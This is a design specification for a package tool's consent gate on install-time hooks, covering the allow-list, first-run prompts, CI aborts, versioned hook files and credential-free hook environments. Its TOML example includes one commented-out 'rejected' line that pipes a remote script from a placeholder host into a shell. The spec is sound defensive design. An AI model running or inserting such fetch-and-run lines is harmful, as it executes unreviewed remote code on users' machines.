# Third-Party Code Consent {#root}

<status stage="spec" state="done"/>

##installing-a-dependency-often-runs-its-own-code **Scope of this document.** Installing or building a dependency often
runs code that dependency shipped — hooks, lifecycle scripts, build
steps. @spec/done

##scope-of-this-document This file defines *why* that code is third-party code that
needs a consent gate, *how* the gate works (an allow-list plus
first-run consent), *why* a non-interactive run aborts rather than
runs unseen code, *why* hooks are versioned reviewable files rather
than inline manifest strings, *why* secrets never enter a hook's
environment, and *how* the residual risk is recorded as a deliberate
stance. @impl/done

##sibling-document-pointers It sits alongside the four laws in
[`SECRETS-HYGIENE-PROTOCOL.md`](SECRETS-HYGIENE-PROTOCOL.md). @impl/done

## Install-time code is third-party code {#third-party}

##INSTALLING-EXECUTES-CODE-YOU-DID-NOT-WRITE When a package declares a script that runs at install or build time,
installing that package **executes code you did not write**, with your
user's privileges, on your machine. @spec/done

##the-same-trust-surface-as-any-ecosystems-hooks This is the same trust surface as
a build script or a post-install hook in any package ecosystem: the
code can read your files, reach the network, and touch anything your
user account can. @spec/done

##the-convenience-is-real-and-so-is-the-exposure The convenience — a package that prepares itself —
is real, and so is the exposure. @spec/done

##the-gate-governs-until-content-inspection-exists The gate below is how the exposure is
governed until stronger content inspection exists. @impl/done

## The consent gate {#consent-gate}

##consent-gate-lead Trust is governed cheaply by an **allow-list plus first-run consent**: @impl/done

- ##GATE-ALLOW-LISTED-PUBLISHERS-RUN-SILENTLY **Allow-listed publishers run silently.** A configured list of
  trusted package groups runs its hooks with no prompt. A team's own
  namespace, or a vendor it has audited and decided to trust, goes on
  the list. This is the escape hatch that keeps trusted, high-volume
  workflows friction-free. @impl/done
- ##GATE-EVERYONE-ELSE-GETS-FIRST-RUN-CONSENT **Everyone else gets first-run consent.** The first time a
  non-allow-listed package would run a hook, the tool prints **exactly
  what will run** — the phase, the script path, the publishing group —
  and asks for a yes/no. Declining skips the hook and marks the
  install as hooks-skipped: surfaced, never silent. @impl/done

| Publisher | Interactive run | Non-interactive / CI run |
|-----------|-----------------|--------------------------|
| ##ROW-GATE-ALLOW-LISTED Allow-listed @impl/done | Runs silently @impl/done | Runs silently @impl/done |
| ##ROW-GATE-NOT-ALLOW-LISTED Not allow-listed @impl/done | Prompts, showing the exact script @impl/done | **Aborts** unless an explicit opt-in flag is passed @impl/done |

## A non-interactive run aborts, never runs unseen {#ci-abort}

##the-critical-cell-is-the-bottom-right The critical cell in that table is the bottom-right. @impl/done

##NO-HUMAN-MEANS-THE-HOOK-IS-NOT-RUN-SILENTLY In a
non-interactive or CI run there is no human to answer the prompt — so
a non-allow-listed package's hook is **not** run silently. @impl/done

##THE-INSTALL-ABORTS-WITH-A-HINT The install
**aborts**, with a hint to either allow-list the group or pass an
explicit opt-in flag. @impl/done

##the-failure-mode-being-prevented The failure mode being prevented is a script executing unseen,
unreviewed third-party code by default, in an automated context where
no one is watching. @spec/done

##SILENCE-NEVER-MEANS-YES Silence-means-yes is exactly wrong here: the safe
default when consent cannot be obtained is to **stop**, not to assume
approval. @impl/done

##ci-abort-forces-the-decision-in-advance Making CI abort forces the trust decision to be made
explicitly and in advance — by putting the group on the allow-list or
passing the flag — rather than implicitly by a machine at 3 a.m. @impl/done

## Hooks are versioned files, not inline strings {#versioned-files}

##A-HOOK-IS-A-VERSIONED-FILE-NOT-AN-INLINE-STRING A hook is a **script file, versioned in the package**, referenced by
path from the manifest — never an inline command string embedded in
the manifest: @impl/done

```toml
# Good — a reviewable, diffable, version-controlled file:
[hooks]
pre-install = "hooks/prepare"

# Rejected — an inline string that hides code in configuration:
# pre-install = "curl https://x.example/i.sh | sh"
```

##an-inline-string-hides-code-and-resists-review An inline string **hides the code in the configuration file and
resists review**. @spec/done

##inline-strings-are-skimmed-past-and-hard-to-diff It is easy to skim past in a manifest, hard to
diff meaningfully across versions, and it invites the one-liner that
pipes a remote script into a shell. @spec/done

##a-versioned-file-is-auditable-and-diffable A versioned file is auditable
(you can read the whole thing), diffable (a changed hook shows up in
review like any other code change), and honest about the fact that it
is code. @spec/done

##the-prompt-points-at-a-real-path The consent prompt can point at a real path, and the
reviewer can open it. @impl/done

## Secrets never enter a hook's environment {#no-secrets-in-env}

##A-CREDENTIAL-IS-NEVER-PLACED-IN-A-HOOKS-ENVIRONMENT A credential is **never placed in the environment of a hook**. @impl/done

##HOOKS-GET-A-DOCUMENTED-CREDENTIAL-FREE-ENVIRONMENT The
tool passes hooks a documented, credential-free environment — package
identity, the working directory, the phase name — and nothing more. @impl/done

##NO-CREDENTIAL-IS-EXPORTED-TO-THIRD-PARTY-CODE
Publish tokens, registry credentials, provider keys: none of them are
exported into a process running third-party code. @impl/done

##this-is-law-three-at-its-sharpest This is Law 3 of the protocol (sanctioned process boundaries) applied
to the sharpest case. @impl/done

##a-hook-is-unreviewed-code-by-definition A hook is unreviewed third-party code by
definition; putting a secret in its environment hands the value to
exactly the code least entitled to it, on a path that was never one of
the sanctioned boundaries. @spec/done

##THE-RULE-IS-ABSOLUTE-AND-NEEDS-NO-EXCEPTION The rule is absolute and needs no
exception: a hook that genuinely needs a credential is a design smell
to escalate to the human, not a reason to widen the environment. @impl/done

## The residual risk, recorded {#residual-risk}

##THE-GATE-REDUCES-BUT-DOES-NOT-ELIMINATE-THE-RISK Even with the gate, running third-party install-time code is a real
risk that the allow-list and consent prompt **reduce but do not
eliminate**. @spec/done

##a-trusted-publisher-or-a-hasty-human-can-still-fail An allow-listed publisher you trusted can ship a
compromised hook; a human clicking through a first-run prompt can
approve something they did not fully read. @spec/done

##THE-RESIDUAL-RISK-IS-RECORDED-AS-A-DELIBERATE-STANCE This residual risk is **recorded as a deliberate, written stance**,
not left as an unstated gap. @impl/done

##THE-PROJECTS-POSITION-ON-HOOK-EXECUTION The project's position is: until an
automated content-inspection gate exists, hook execution is an
explicitly accepted risk governed by the allow-list plus consent, and
that acceptance is documented here so it is a decision on the record
rather than an oversight. @impl/done

##WHEN-UNCERTAIN-TREAT-AS-UNTRUSTED-AND-ASK When uncertain whether a given publisher or
hook is safe, the conservative default applies — treat it as untrusted
and ask the human. @impl/done

## Summary {#summary}

- ##SUM-HOOKS-ARE-THIRD-PARTY-CODE Install/build hooks are third-party code running with your
  privileges — a real trust surface. @spec/done
- ##SUM-THE-GATE-IS-ALLOW-LIST-PLUS-CONSENT The gate: allow-listed publishers run silently; everyone else gets
  first-run consent showing the exact script. @impl/done
- ##SUM-CI-ABORTS-AND-SILENCE-NEVER-MEANS-YES A non-interactive/CI run **aborts** rather than running unseen code;
  silence never means yes. @impl/done
- ##SUM-HOOKS-ARE-VERSIONED-FILES Hooks are versioned, reviewable files referenced by path — never
  inline manifest strings that hide code and resist review. @impl/done
- ##SUM-NO-SECRET-IN-A-HOOKS-ENVIRONMENT A secret is never placed in a hook's environment (Law 3 at its
  sharpest). @impl/done
- ##SUM-THE-RESIDUAL-RISK-IS-RECORDED The residual risk is accepted deliberately and recorded here, not
  left unstated; when in doubt, treat as untrusted and ask. @impl/done
